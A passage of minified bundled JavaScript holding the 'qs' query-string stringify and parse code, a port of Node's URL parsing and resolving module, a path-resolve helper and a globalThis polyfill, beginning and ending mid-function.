      , ee = function(ue) {
        return !ue || typeof ue != "object" ? !1 : !!(ue.constructor && ue.constructor.isBuffer && ue.constructor.isBuffer(ue))
    }
      , ae = function(ue, fe) {
        return [].concat(ue, fe)
    }
      , ne = function(ue, fe) {
        if (j(ue)) {
            for (var he = [], pe = 0; pe < ue.length; pe += 1)
                he.push(fe(ue[pe]));
            return he
        }
        return fe(ue)
    };
    return utils$3 = {
        arrayToObject: w,
        assign: X,
        combine: ae,
        compact: K,
        decode: Y,
        encode: V,
        isBuffer: ee,
        isRegExp: Q,
        maybeMap: ne,
        merge: b
    },
    utils$3
}
var stringify_1, hasRequiredStringify;
function requireStringify() {
    if (hasRequiredStringify)
        return stringify_1;
    hasRequiredStringify = 1;
    var _ = requireSideChannel()
      , M = requireUtils$1()
      , j = requireFormats()
      , O = Object.prototype.hasOwnProperty
      , x = {
        brackets: function(oe) {
            return oe + "[]"
        },
        comma: "comma",
        indices: function(oe, ue) {
            return oe + "[" + ue + "]"
        },
        repeat: function(oe) {
            return oe
        }
    }
      , w = Array.isArray
      , b = Array.prototype.push
      , X = function(ne, oe) {
        b.apply(ne, w(oe) ? oe : [oe])
    }
      , Y = Date.prototype.toISOString
      , F = j.default
      , V = {
        addQueryPrefix: !1,
        allowDots: !1,
        allowEmptyArrays: !1,
        arrayFormat: "indices",
        charset: "utf-8",
        charsetSentinel: !1,
        commaRoundTrip: !1,
        delimiter: "&",
        encode: !0,
        encodeDotInKeys: !1,
        encoder: M.encode,
        encodeValuesOnly: !1,
        filter: void 0,
        format: F,
        formatter: j.formatters[F],
        indices: !1,
        serializeDate: function(oe) {
            return Y.call(oe)
        },
        skipNulls: !1,
        strictNullHandling: !1
    }
      , K = function(oe) {
        return typeof oe == "string" || typeof oe == "number" || typeof oe == "boolean" || typeof oe == "symbol" || typeof oe == "bigint"
    }
      , Q = {}
      , ee = function ne(oe, ue, fe, he, pe, ye, be, xe, Ae, Ee, Be, ce, q, L, U, Z, te, se) {
        for (var de = oe, re = se, $ = 0, ie = !1; (re = re.get(Q)) !== void 0 && !ie; ) {
            var ve = re.get(oe);
            if ($ += 1,
            typeof ve < "u") {
                if (ve === $)
                    throw new RangeError("Cyclic object value");
                ie = !0
            }
            typeof re.get(Q) > "u" && ($ = 0)
        }
        if (typeof Ee == "function" ? de = Ee(ue, de) : de instanceof Date ? de = q(de) : fe === "comma" && w(de) && (de = M.maybeMap(de, function(nt) {
            return nt instanceof Date ? q(nt) : nt
        })),
        de === null) {
            if (ye)
                return Ae && !Z ? Ae(ue, V.encoder, te, "key", L) : ue;
            de = ""
        }
        if (K(de) || M.isBuffer(de)) {
            if (Ae) {
                var ge = Z ? ue : Ae(ue, V.encoder, te, "key", L);
                return [U(ge) + "=" + U(Ae(de, V.encoder, te, "value", L))]
            }
            return [U(ue) + "=" + U(String(de))]
        }
        var Re = [];
        if (typeof de > "u")
            return Re;
        var Pe;
        if (fe === "comma" && w(de))
            Z && Ae && (de = M.maybeMap(de, Ae)),
            Pe = [{
                value: de.length > 0 ? de.join(",") || null : void 0
            }];
        else if (w(Ee))
            Pe = Ee;
        else {
            var Ie = Object.keys(de);
            Pe = Be ? Ie.sort(Be) : Ie
        }
        var Te = xe ? String(ue).replace(/\./g, "%2E") : String(ue)
          , Le = he && w(de) && de.length === 1 ? Te + "[]" : Te;
        if (pe && w(de) && de.length === 0)
            return Le + "[]";
        for (var Ze = 0; Ze < Pe.length; ++Ze) {
            var $e = Pe[Ze]
              , Ne = typeof $e == "object" && $e && typeof $e.value < "u" ? $e.value : de[$e];
            if (!(be && Ne === null)) {
                var qe = ce && xe ? String($e).replace(/\./g, "%2E") : String($e)
                  , Ve = w(de) ? typeof fe == "function" ? fe(Le, qe) : Le : Le + (ce ? "." + qe : "[" + qe + "]");
                se.set(oe, $);
                var lt = _();
                lt.set(Q, se),
                X(Re, ne(Ne, Ve, fe, he, pe, ye, be, xe, fe === "comma" && Z && w(de) ? null : Ae, Ee, Be, ce, q, L, U, Z, te, lt))
            }
        }
        return Re
    }
      , ae = function(oe) {
        if (!oe)
            return V;
        if (typeof oe.allowEmptyArrays < "u" && typeof oe.allowEmptyArrays != "boolean")
            throw new TypeError("`allowEmptyArrays` option can only be `true` or `false`, when provided");
        if (typeof oe.encodeDotInKeys < "u" && typeof oe.encodeDotInKeys != "boolean")
            throw new TypeError("`encodeDotInKeys` option can only be `true` or `false`, when provided");
        if (oe.encoder !== null && typeof oe.encoder < "u" && typeof oe.encoder != "function")
            throw new TypeError("Encoder has to be a function.");
        var ue = oe.charset || V.charset;
        if (typeof oe.charset < "u" && oe.charset !== "utf-8" && oe.charset !== "iso-8859-1")
            throw new TypeError("The charset option must be either utf-8, iso-8859-1, or undefined");
        var fe = j.default;
        if (typeof oe.format < "u") {
            if (!O.call(j.formatters, oe.format))
                throw new TypeError("Unknown format option provided.");
            fe = oe.format
        }
        var he = j.formatters[fe]
          , pe = V.filter;
        (typeof oe.filter == "function" || w(oe.filter)) && (pe = oe.filter);
        var ye;
        if (oe.arrayFormat in x ? ye = oe.arrayFormat : "indices"in oe ? ye = oe.indices ? "indices" : "repeat" : ye = V.arrayFormat,
        "commaRoundTrip"in oe && typeof oe.commaRoundTrip != "boolean")
            throw new TypeError("`commaRoundTrip` must be a boolean, or absent");
        var be = typeof oe.allowDots > "u" ? oe.encodeDotInKeys === !0 ? !0 : V.allowDots : !!oe.allowDots;
        return {
            addQueryPrefix: typeof oe.addQueryPrefix == "boolean" ? oe.addQueryPrefix : V.addQueryPrefix,
            allowDots: be,
            allowEmptyArrays: typeof oe.allowEmptyArrays == "boolean" ? !!oe.allowEmptyArrays : V.allowEmptyArrays,
            arrayFormat: ye,
            charset: ue,
            charsetSentinel: typeof oe.charsetSentinel == "boolean" ? oe.charsetSentinel : V.charsetSentinel,
            commaRoundTrip: !!oe.commaRoundTrip,
            delimiter: typeof oe.delimiter > "u" ? V.delimiter : oe.delimiter,
            encode: typeof oe.encode == "boolean" ? oe.encode : V.encode,
            encodeDotInKeys: typeof oe.encodeDotInKeys == "boolean" ? oe.encodeDotInKeys : V.encodeDotInKeys,
            encoder: typeof oe.encoder == "function" ? oe.encoder : V.encoder,
            encodeValuesOnly: typeof oe.encodeValuesOnly == "boolean" ? oe.encodeValuesOnly : V.encodeValuesOnly,
            filter: pe,
            format: fe,
            formatter: he,
            serializeDate: typeof oe.serializeDate == "function" ? oe.serializeDate : V.serializeDate,
            skipNulls: typeof oe.skipNulls == "boolean" ? oe.skipNulls : V.skipNulls,
            sort: typeof oe.sort == "function" ? oe.sort : null,
            strictNullHandling: typeof oe.strictNullHandling == "boolean" ? oe.strictNullHandling : V.strictNullHandling
        }
    };
    return stringify_1 = function(ne, oe) {
        var ue = ne, fe = ae(oe), he, pe;
        typeof fe.filter == "function" ? (pe = fe.filter,
        ue = pe("", ue)) : w(fe.filter) && (pe = fe.filter,
        he = pe);
        var ye = [];
        if (typeof ue != "object" || ue === null)
            return "";
        var be = x[fe.arrayFormat]
          , xe = be === "comma" && fe.commaRoundTrip;
        he || (he = Object.keys(ue)),
        fe.sort && he.sort(fe.sort);
        for (var Ae = _(), Ee = 0; Ee < he.length; ++Ee) {
            var Be = he[Ee]
              , ce = ue[Be];
            fe.skipNulls && ce === null || X(ye, ee(ce, Be, be, xe, fe.allowEmptyArrays, fe.strictNullHandling, fe.skipNulls, fe.encodeDotInKeys, fe.encode ? fe.encoder : null, fe.filter, fe.sort, fe.allowDots, fe.serializeDate, fe.format, fe.formatter, fe.encodeValuesOnly, fe.charset, Ae))
        }
        var q = ye.join(fe.delimiter)
          , L = fe.addQueryPrefix === !0 ? "?" : "";
        return fe.charsetSentinel && (fe.charset === "iso-8859-1" ? L += "utf8=%26%2310003%3B&" : L += "utf8=%E2%9C%93&"),
        q.length > 0 ? L + q : ""
    }
    ,
    stringify_1
}
var parse$1, hasRequiredParse;
function requireParse() {
    if (hasRequiredParse)
        return parse$1;
    hasRequiredParse = 1;
    var _ = requireUtils$1()
      , M = Object.prototype.hasOwnProperty
      , j = Array.isArray
      , O = {
        allowDots: !1,
        allowEmptyArrays: !1,
        allowPrototypes: !1,
        allowSparse: !1,
        arrayLimit: 20,
        charset: "utf-8",
        charsetSentinel: !1,
        comma: !1,
        decodeDotInKeys: !1,
        decoder: _.decode,
        delimiter: "&",
        depth: 5,
        duplicates: "combine",
        ignoreQueryPrefix: !1,
        interpretNumericEntities: !1,
        parameterLimit: 1e3,
        parseArrays: !0,
        plainObjects: !1,
        strictDepth: !1,
        strictNullHandling: !1,
        throwOnLimitExceeded: !1
    }
      , x = function(Q) {
        return Q.replace(/&#(\d+);/g, function(ee, ae) {
            return String.fromCharCode(parseInt(ae, 10))
        })
    }
      , w = function(Q, ee, ae) {
        if (Q && typeof Q == "string" && ee.comma && Q.indexOf(",") > -1)
            return Q.split(",");
        if (ee.throwOnLimitExceeded && ae >= ee.arrayLimit)
            throw new RangeError("Array limit exceeded. Only " + ee.arrayLimit + " element" + (ee.arrayLimit === 1 ? "" : "s") + " allowed in an array.");
        return Q
    }
      , b = "utf8=%26%2310003%3B"
      , X = "utf8=%E2%9C%93"
      , Y = function(ee, ae) {
        var ne = {
            __proto__: null
        }
          , oe = ae.ignoreQueryPrefix ? ee.replace(/^\?/, "") : ee;
        oe = oe.replace(/%5B/gi, "[").replace(/%5D/gi, "]");
        var ue = ae.parameterLimit === 1 / 0 ? void 0 : ae.parameterLimit
          , fe = oe.split(ae.delimiter, ae.throwOnLimitExceeded ? ue + 1 : ue);
        if (ae.throwOnLimitExceeded && fe.length > ue)
            throw new RangeError("Parameter limit exceeded. Only " + ue + " parameter" + (ue === 1 ? "" : "s") + " allowed.");
        var he = -1, pe, ye = ae.charset;
        if (ae.charsetSentinel)
            for (pe = 0; pe < fe.length; ++pe)
                fe[pe].indexOf("utf8=") === 0 && (fe[pe] === X ? ye = "utf-8" : fe[pe] === b && (ye = "iso-8859-1"),
                he = pe,
                pe = fe.length);
        for (pe = 0; pe < fe.length; ++pe)
            if (pe !== he) {
                var be = fe[pe], xe = be.indexOf("]="), Ae = xe === -1 ? be.indexOf("=") : xe + 1, Ee, Be;
                Ae === -1 ? (Ee = ae.decoder(be, O.decoder, ye, "key"),
                Be = ae.strictNullHandling ? null : "") : (Ee = ae.decoder(be.slice(0, Ae), O.decoder, ye, "key"),
                Be = _.maybeMap(w(be.slice(Ae + 1), ae, j(ne[Ee]) ? ne[Ee].length : 0), function(q) {
                    return ae.decoder(q, O.decoder, ye, "value")
                })),
                Be && ae.interpretNumericEntities && ye === "iso-8859-1" && (Be = x(String(Be))),
                be.indexOf("[]=") > -1 && (Be = j(Be) ? [Be] : Be);
                var ce = M.call(ne, Ee);
                ce && ae.duplicates === "combine" ? ne[Ee] = _.combine(ne[Ee], Be) : (!ce || ae.duplicates === "last") && (ne[Ee] = Be)
            }
        return ne
    }
      , F = function(Q, ee, ae, ne) {
        var oe = 0;
        if (Q.length > 0 && Q[Q.length - 1] === "[]") {
            var ue = Q.slice(0, -1).join("");
            oe = Array.isArray(ee) && ee[ue] ? ee[ue].length : 0
        }
        for (var fe = ne ? ee : w(ee, ae, oe), he = Q.length - 1; he >= 0; --he) {
            var pe, ye = Q[he];
            if (ye === "[]" && ae.parseArrays)
                pe = ae.allowEmptyArrays && (fe === "" || ae.strictNullHandling && fe === null) ? [] : _.combine([], fe);
            else {
                pe = ae.plainObjects ? {
                    __proto__: null
                } : {};
                var be = ye.charAt(0) === "[" && ye.charAt(ye.length - 1) === "]" ? ye.slice(1, -1) : ye
                  , xe = ae.decodeDotInKeys ? be.replace(/%2E/g, ".") : be
                  , Ae = parseInt(xe, 10);
                !ae.parseArrays && xe === "" ? pe = {
                    0: fe
                } : !isNaN(Ae) && ye !== xe && String(Ae) === xe && Ae >= 0 && ae.parseArrays && Ae <= ae.arrayLimit ? (pe = [],
                pe[Ae] = fe) : xe !== "__proto__" && (pe[xe] = fe)
            }
            fe = pe
        }
        return fe
    }
      , V = function(ee, ae, ne, oe) {
        if (ee) {
            var ue = ne.allowDots ? ee.replace(/\.([^.[]+)/g, "[$1]") : ee
              , fe = /(\[[^[\]]*])/
              , he = /(\[[^[\]]*])/g
              , pe = ne.depth > 0 && fe.exec(ue)
              , ye = pe ? ue.slice(0, pe.index) : ue
              , be = [];
            if (ye) {
                if (!ne.plainObjects && M.call(Object.prototype, ye) && !ne.allowPrototypes)
                    return;
                be.push(ye)
            }
            for (var xe = 0; ne.depth > 0 && (pe = he.exec(ue)) !== null && xe < ne.depth; ) {
                if (xe += 1,
                !ne.plainObjects && M.call(Object.prototype, pe[1].slice(1, -1)) && !ne.allowPrototypes)
                    return;
                be.push(pe[1])
            }
            if (pe) {
                if (ne.strictDepth === !0)
                    throw new RangeError("Input depth exceeded depth option of " + ne.depth + " and strictDepth is true");
                be.push("[" + ue.slice(pe.index) + "]")
            }
            return F(be, ae, ne, oe)
        }
    }
      , K = function(ee) {
        if (!ee)
            return O;
        if (typeof ee.allowEmptyArrays < "u" && typeof ee.allowEmptyArrays != "boolean")
            throw new TypeError("`allowEmptyArrays` option can only be `true` or `false`, when provided");
        if (typeof ee.decodeDotInKeys < "u" && typeof ee.decodeDotInKeys != "boolean")
            throw new TypeError("`decodeDotInKeys` option can only be `true` or `false`, when provided");
        if (ee.decoder !== null && typeof ee.decoder < "u" && typeof ee.decoder != "function")
            throw new TypeError("Decoder has to be a function.");
        if (typeof ee.charset < "u" && ee.charset !== "utf-8" && ee.charset !== "iso-8859-1")
            throw new TypeError("The charset option must be either utf-8, iso-8859-1, or undefined");
        if (typeof ee.throwOnLimitExceeded < "u" && typeof ee.throwOnLimitExceeded != "boolean")
            throw new TypeError("`throwOnLimitExceeded` option must be a boolean");
        var ae = typeof ee.charset > "u" ? O.charset : ee.charset
          , ne = typeof ee.duplicates > "u" ? O.duplicates : ee.duplicates;
        if (ne !== "combine" && ne !== "first" && ne !== "last")
            throw new TypeError("The duplicates option must be either combine, first, or last");
        var oe = typeof ee.allowDots > "u" ? ee.decodeDotInKeys === !0 ? !0 : O.allowDots : !!ee.allowDots;
        return {
            allowDots: oe,
            allowEmptyArrays: typeof ee.allowEmptyArrays == "boolean" ? !!ee.allowEmptyArrays : O.allowEmptyArrays,
            allowPrototypes: typeof ee.allowPrototypes == "boolean" ? ee.allowPrototypes : O.allowPrototypes,
            allowSparse: typeof ee.allowSparse == "boolean" ? ee.allowSparse : O.allowSparse,
            arrayLimit: typeof ee.arrayLimit == "number" ? ee.arrayLimit : O.arrayLimit,
            charset: ae,
            charsetSentinel: typeof ee.charsetSentinel == "boolean" ? ee.charsetSentinel : O.charsetSentinel,
            comma: typeof ee.comma == "boolean" ? ee.comma : O.comma,
            decodeDotInKeys: typeof ee.decodeDotInKeys == "boolean" ? ee.decodeDotInKeys : O.decodeDotInKeys,
            decoder: typeof ee.decoder == "function" ? ee.decoder : O.decoder,
            delimiter: typeof ee.delimiter == "string" || _.isRegExp(ee.delimiter) ? ee.delimiter : O.delimiter,
            depth: typeof ee.depth == "number" || ee.depth === !1 ? +ee.depth : O.depth,
            duplicates: ne,
            ignoreQueryPrefix: ee.ignoreQueryPrefix === !0,
            interpretNumericEntities: typeof ee.interpretNumericEntities == "boolean" ? ee.interpretNumericEntities : O.interpretNumericEntities,
            parameterLimit: typeof ee.parameterLimit == "number" ? ee.parameterLimit : O.parameterLimit,
            parseArrays: ee.parseArrays !== !1,
            plainObjects: typeof ee.plainObjects == "boolean" ? ee.plainObjects : O.plainObjects,
            strictDepth: typeof ee.strictDepth == "boolean" ? !!ee.strictDepth : O.strictDepth,
            strictNullHandling: typeof ee.strictNullHandling == "boolean" ? ee.strictNullHandling : O.strictNullHandling,
            throwOnLimitExceeded: typeof ee.throwOnLimitExceeded == "boolean" ? ee.throwOnLimitExceeded : !1
        }
    };
    return parse$1 = function(Q, ee) {
        var ae = K(ee);
        if (Q === "" || Q === null || typeof Q > "u")
            return ae.plainObjects ? {
                __proto__: null
            } : {};
        for (var ne = typeof Q == "string" ? Y(Q, ae) : Q, oe = ae.plainObjects ? {
            __proto__: null
        } : {}, ue = Object.keys(ne), fe = 0; fe < ue.length; ++fe) {
            var he = ue[fe]
              , pe = V(he, ne[he], ae, typeof Q == "string");
            oe = _.merge(oe, pe, ae)
        }
        return ae.allowSparse === !0 ? oe : _.compact(oe)
    }
    ,
    parse$1
}
var lib$1, hasRequiredLib$2;
function requireLib$2() {
    if (hasRequiredLib$2)
        return lib$1;
    hasRequiredLib$2 = 1;
    var _ = requireStringify()
      , M = requireParse()
      , j = requireFormats();
    return lib$1 = {
        formats: j,
        parse: M,
        stringify: _
    },
    lib$1
}
var libExports$2 = requireLib$2();
const require$$1$1 = getDefaultExportFromCjs$1(libExports$2);
var punycode = require$$0;
function Url() {
    this.protocol = null,
    this.slashes = null,
    this.auth = null,
    this.host = null,
    this.port = null,
    this.hostname = null,
    this.hash = null,
    this.search = null,
    this.query = null,
    this.pathname = null,
    this.path = null,
    this.href = null
}
var protocolPattern = /^([a-z0-9.+-]+:)/i
  , portPattern = /:[0-9]*$/
  , simplePathPattern = /^(\/\/?(?!\/)[^?\s]*)(\?[^\s]*)?$/
  , delims = ["<", ">", '"', "`", " ", "\r", `
`, "	"]
  , unwise = ["{", "}", "|", "\\", "^", "`"].concat(delims)
  , autoEscape = ["'"].concat(unwise)
  , nonHostChars = ["%", "/", "?", ";", "#"].concat(autoEscape)
  , hostEndingChars = ["/", "?", "#"]
  , hostnameMaxLen = 255
  , hostnamePartPattern = /^[+a-z0-9A-Z_-]{0,63}$/
  , hostnamePartStart = /^([+a-z0-9A-Z_-]{0,63})(.*)$/
  , unsafeProtocol = {
    javascript: !0,
    "javascript:": !0
}
  , hostlessProtocol = {
    javascript: !0,
    "javascript:": !0
}
  , slashedProtocol = {
    http: !0,
    https: !0,
    ftp: !0,
    gopher: !0,
    file: !0,
    "http:": !0,
    "https:": !0,
    "ftp:": !0,
    "gopher:": !0,
    "file:": !0
}
  , querystring = require$$1$1;
function urlParse(_, M, j) {
    if (_ && typeof _ == "object" && _ instanceof Url)
        return _;
    var O = new Url;
    return O.parse(_, M, j),
    O
}
Url.prototype.parse = function(_, M, j) {
    if (typeof _ != "string")
        throw new TypeError("Parameter 'url' must be a string, not " + typeof _);
    var O = _.indexOf("?")
      , x = O !== -1 && O < _.indexOf("#") ? "?" : "#"
      , w = _.split(x)
      , b = /\\/g;
    w[0] = w[0].replace(b, "/"),
    _ = w.join(x);
    var X = _;
    if (X = X.trim(),
    !j && _.split("#").length === 1) {
        var Y = simplePathPattern.exec(X);
        if (Y)
            return this.path = X,
            this.href = X,
            this.pathname = Y[1],
            Y[2] ? (this.search = Y[2],
            M ? this.query = querystring.parse(this.search.substr(1)) : this.query = this.search.substr(1)) : M && (this.search = "",
            this.query = {}),
            this
    }
    var F = protocolPattern.exec(X);
    if (F) {
        F = F[0];
        var V = F.toLowerCase();
        this.protocol = V,
        X = X.substr(F.length)
    }
    if (j || F || X.match(/^\/\/[^@/]+@[^@/]+/)) {
        var K = X.substr(0, 2) === "//";
        K && !(F && hostlessProtocol[F]) && (X = X.substr(2),
        this.slashes = !0)
    }
    if (!hostlessProtocol[F] && (K || F && !slashedProtocol[F])) {
        for (var Q = -1, ee = 0; ee < hostEndingChars.length; ee++) {
            var ae = X.indexOf(hostEndingChars[ee]);
            ae !== -1 && (Q === -1 || ae < Q) && (Q = ae)
        }
        var ne, oe;
        Q === -1 ? oe = X.lastIndexOf("@") : oe = X.lastIndexOf("@", Q),
        oe !== -1 && (ne = X.slice(0, oe),
        X = X.slice(oe + 1),
        this.auth = decodeURIComponent(ne)),
        Q = -1;
        for (var ee = 0; ee < nonHostChars.length; ee++) {
            var ae = X.indexOf(nonHostChars[ee]);
            ae !== -1 && (Q === -1 || ae < Q) && (Q = ae)
        }
        Q === -1 && (Q = X.length),
        this.host = X.slice(0, Q),
        X = X.slice(Q),
        this.parseHost(),
        this.hostname = this.hostname || "";
        var ue = this.hostname[0] === "[" && this.hostname[this.hostname.length - 1] === "]";
        if (!ue)
            for (var fe = this.hostname.split(/\./), ee = 0, he = fe.length; ee < he; ee++) {
                var pe = fe[ee];
                if (pe && !pe.match(hostnamePartPattern)) {
                    for (var ye = "", be = 0, xe = pe.length; be < xe; be++)
                        pe.charCodeAt(be) > 127 ? ye += "x" : ye += pe[be];
                    if (!ye.match(hostnamePartPattern)) {
                        var Ae = fe.slice(0, ee)
                          , Ee = fe.slice(ee + 1)
                          , Be = pe.match(hostnamePartStart);
                        Be && (Ae.push(Be[1]),
                        Ee.unshift(Be[2])),
                        Ee.length && (X = "/" + Ee.join(".") + X),
                        this.hostname = Ae.join(".");
                        break
                    }
                }
            }
        this.hostname.length > hostnameMaxLen ? this.hostname = "" : this.hostname = this.hostname.toLowerCase(),
        ue || (this.hostname = punycode.toASCII(this.hostname));
        var ce = this.port ? ":" + this.port : ""
          , q = this.hostname || "";
        this.host = q + ce,
        this.href += this.host,
        ue && (this.hostname = this.hostname.substr(1, this.hostname.length - 2),
        X[0] !== "/" && (X = "/" + X))
    }
    if (!unsafeProtocol[V])
        for (var ee = 0, he = autoEscape.length; ee < he; ee++) {
            var L = autoEscape[ee];
            if (X.indexOf(L) !== -1) {
                var U = encodeURIComponent(L);
                U === L && (U = escape(L)),
                X = X.split(L).join(U)
            }
        }
    var Z = X.indexOf("#");
    Z !== -1 && (this.hash = X.substr(Z),
    X = X.slice(0, Z));
    var te = X.indexOf("?");
    if (te !== -1 ? (this.search = X.substr(te),
    this.query = X.substr(te + 1),
    M && (this.query = querystring.parse(this.query)),
    X = X.slice(0, te)) : M && (this.search = "",
    this.query = {}),
    X && (this.pathname = X),
    slashedProtocol[V] && this.hostname && !this.pathname && (this.pathname = "/"),
    this.pathname || this.search) {
        var ce = this.pathname || ""
          , se = this.search || "";
        this.path = ce + se
    }
    return this.href = this.format(),
    this
}
;
function urlFormat(_) {
    return typeof _ == "string" && (_ = urlParse(_)),
    _ instanceof Url ? _.format() : Url.prototype.format.call(_)
}
Url.prototype.format = function() {
    var _ = this.auth || "";
    _ && (_ = encodeURIComponent(_),
    _ = _.replace(/%3A/i, ":"),
    _ += "@");
    var M = this.protocol || ""
      , j = this.pathname || ""
      , O = this.hash || ""
      , x = !1
      , w = "";
    this.host ? x = _ + this.host : this.hostname && (x = _ + (this.hostname.indexOf(":") === -1 ? this.hostname : "[" + this.hostname + "]"),
    this.port && (x += ":" + this.port)),
    this.query && typeof this.query == "object" && Object.keys(this.query).length && (w = querystring.stringify(this.query, {
        arrayFormat: "repeat",
        addQueryPrefix: !1
    }));
    var b = this.search || w && "?" + w || "";
    return M && M.substr(-1) !== ":" && (M += ":"),
    this.slashes || (!M || slashedProtocol[M]) && x !== !1 ? (x = "//" + (x || ""),
    j && j.charAt(0) !== "/" && (j = "/" + j)) : x || (x = ""),
    O && O.charAt(0) !== "#" && (O = "#" + O),
    b && b.charAt(0) !== "?" && (b = "?" + b),
    j = j.replace(/[?#]/g, function(X) {
        return encodeURIComponent(X)
    }),
    b = b.replace("#", "%23"),
    M + x + j + b + O
}
;
function urlResolve(_, M) {
    return urlParse(_, !1, !0).resolve(M)
}
Url.prototype.resolve = function(_) {
    return this.resolveObject(urlParse(_, !1, !0)).format()
}
;
function urlResolveObject(_, M) {
    return _ ? urlParse(_, !1, !0).resolveObject(M) : M
}
Url.prototype.resolveObject = function(_) {
    if (typeof _ == "string") {
        var M = new Url;
        M.parse(_, !1, !0),
        _ = M
    }
    for (var j = new Url, O = Object.keys(this), x = 0; x < O.length; x++) {
        var w = O[x];
        j[w] = this[w]
    }
    if (j.hash = _.hash,
    _.href === "")
        return j.href = j.format(),
        j;
    if (_.slashes && !_.protocol) {
        for (var b = Object.keys(_), X = 0; X < b.length; X++) {
            var Y = b[X];
            Y !== "protocol" && (j[Y] = _[Y])
        }
        return slashedProtocol[j.protocol] && j.hostname && !j.pathname && (j.pathname = "/",
        j.path = j.pathname),
        j.href = j.format(),
        j
    }
    if (_.protocol && _.protocol !== j.protocol) {
        if (!slashedProtocol[_.protocol]) {
            for (var F = Object.keys(_), V = 0; V < F.length; V++) {
                var K = F[V];
                j[K] = _[K]
            }
            return j.href = j.format(),
            j
        }
        if (j.protocol = _.protocol,
        !_.host && !hostlessProtocol[_.protocol]) {
            for (var he = (_.pathname || "").split("/"); he.length && !(_.host = he.shift()); )
                ;
            _.host || (_.host = ""),
            _.hostname || (_.hostname = ""),
            he[0] !== "" && he.unshift(""),
            he.length < 2 && he.unshift(""),
            j.pathname = he.join("/")
        } else
            j.pathname = _.pathname;
        if (j.search = _.search,
        j.query = _.query,
        j.host = _.host || "",
        j.auth = _.auth,
        j.hostname = _.hostname || _.host,
        j.port = _.port,
        j.pathname || j.search) {
            var Q = j.pathname || ""
              , ee = j.search || "";
            j.path = Q + ee
        }
        return j.slashes = j.slashes || _.slashes,
        j.href = j.format(),
        j
    }
    var ae = j.pathname && j.pathname.charAt(0) === "/"
      , ne = _.host || _.pathname && _.pathname.charAt(0) === "/"
      , oe = ne || ae || j.host && _.pathname
      , ue = oe
      , fe = j.pathname && j.pathname.split("/") || []
      , he = _.pathname && _.pathname.split("/") || []
      , pe = j.protocol && !slashedProtocol[j.protocol];
    if (pe && (j.hostname = "",
    j.port = null,
    j.host && (fe[0] === "" ? fe[0] = j.host : fe.unshift(j.host)),
    j.host = "",
    _.protocol && (_.hostname = null,
    _.port = null,
    _.host && (he[0] === "" ? he[0] = _.host : he.unshift(_.host)),
    _.host = null),
    oe = oe && (he[0] === "" || fe[0] === "")),
    ne)
        j.host = _.host || _.host === "" ? _.host : j.host,
        j.hostname = _.hostname || _.hostname === "" ? _.hostname : j.hostname,
        j.search = _.search,
        j.query = _.query,
        fe = he;
    else if (he.length)
        fe || (fe = []),
        fe.pop(),
        fe = fe.concat(he),
        j.search = _.search,
        j.query = _.query;
    else if (_.search != null) {
        if (pe) {
            j.host = fe.shift(),
            j.hostname = j.host;
            var ye = j.host && j.host.indexOf("@") > 0 ? j.host.split("@") : !1;
            ye && (j.auth = ye.shift(),
            j.hostname = ye.shift(),
            j.host = j.hostname)
        }
        return j.search = _.search,
        j.query = _.query,
        (j.pathname !== null || j.search !== null) && (j.path = (j.pathname ? j.pathname : "") + (j.search ? j.search : "")),
        j.href = j.format(),
        j
    }
    if (!fe.length)
        return j.pathname = null,
        j.search ? j.path = "/" + j.search : j.path = null,
        j.href = j.format(),
        j;
    for (var be = fe.slice(-1)[0], xe = (j.host || _.host || fe.length > 1) && (be === "." || be === "..") || be === "", Ae = 0, Ee = fe.length; Ee >= 0; Ee--)
        be = fe[Ee],
        be === "." ? fe.splice(Ee, 1) : be === ".." ? (fe.splice(Ee, 1),
        Ae++) : Ae && (fe.splice(Ee, 1),
        Ae--);
    if (!oe && !ue)
        for (; Ae--; Ae)
            fe.unshift("..");
    oe && fe[0] !== "" && (!fe[0] || fe[0].charAt(0) !== "/") && fe.unshift(""),
    xe && fe.join("/").substr(-1) !== "/" && fe.push("");
    var Be = fe[0] === "" || fe[0] && fe[0].charAt(0) === "/";
    if (pe) {
        j.hostname = Be ? "" : fe.length ? fe.shift() : "",
        j.host = j.hostname;
        var ye = j.host && j.host.indexOf("@") > 0 ? j.host.split("@") : !1;
        ye && (j.auth = ye.shift(),
        j.hostname = ye.shift(),
        j.host = j.hostname)
    }
    return oe = oe || j.host && fe.length,
    oe && !Be && fe.unshift(""),
    fe.length > 0 ? j.pathname = fe.join("/") : (j.pathname = null,
    j.path = null),
    (j.pathname !== null || j.search !== null) && (j.path = (j.pathname ? j.pathname : "") + (j.search ? j.search : "")),
    j.auth = _.auth || j.auth,
    j.slashes = j.slashes || _.slashes,
    j.href = j.format(),
    j
}
;
Url.prototype.parseHost = function() {
    var _ = this.host
      , M = portPattern.exec(_);
    M && (M = M[0],
    M !== ":" && (this.port = M.substr(1)),
    _ = _.substr(0, _.length - M.length)),
    _ && (this.hostname = _)
}
;
var parse = urlParse
  , resolve$1 = urlResolve
  , resolveObject = urlResolveObject
  , format = urlFormat
  , Url_1 = Url;
function normalizeArray(_, M) {
    for (var j = 0, O = _.length - 1; O >= 0; O--) {
        var x = _[O];
        x === "." ? _.splice(O, 1) : x === ".." ? (_.splice(O, 1),
        j++) : j && (_.splice(O, 1),
        j--)
    }
    if (M)
        for (; j--; j)
            _.unshift("..");
    return _
}
function resolve() {
    for (var _ = "", M = !1, j = arguments.length - 1; j >= -1 && !M; j--) {
        var O = j >= 0 ? arguments[j] : "/";
        if (typeof O != "string")
            throw new TypeError("Arguments to path.resolve must be strings");
        if (!O)
            continue;
        _ = O + "/" + _,
        M = O.charAt(0) === "/"
    }
    return _ = normalizeArray(filter(_.split("/"), function(x) {
        return !!x
    }), !M).join("/"),
    (M ? "/" : "") + _ || "."
}
function filter(_, M) {
    if (_.filter)
        return _.filter(M);
    for (var j = [], O = 0; O < _.length; O++)
        M(_[O], O, _) && j.push(_[O]);
    return j
}
var _globalThis = function(_) {
    function M() {
        var O = this || self;
        return delete _.prototype.__magic__,
        O
    }
    if (typeof globalThis == "object")
        return globalThis;
    if (this)
        return M();
    _.defineProperty(_.prototype, "__magic__", {
        configurable: !0,
        get: M
    });
    var j = __magic__;
    return j
}(Object)
  , formatImport = format
  , parseImport = parse
  , resolveImport = resolve$1
  , UrlImport = Url_1
  , URL$1 = _globalThis.URL
  , URLSearchParams$2 = _globalThis.URLSearchParams
  , percentRegEx = /%/g
  , backslashRegEx = /\\/g
  , newlineRegEx = /\n/g
  , carriageReturnRegEx = /\r/g
  , tabRegEx = /\t/g
  , CHAR_FORWARD_SLASH = 47;
function isURLInstance(_) {
    var M = _ ?? null;
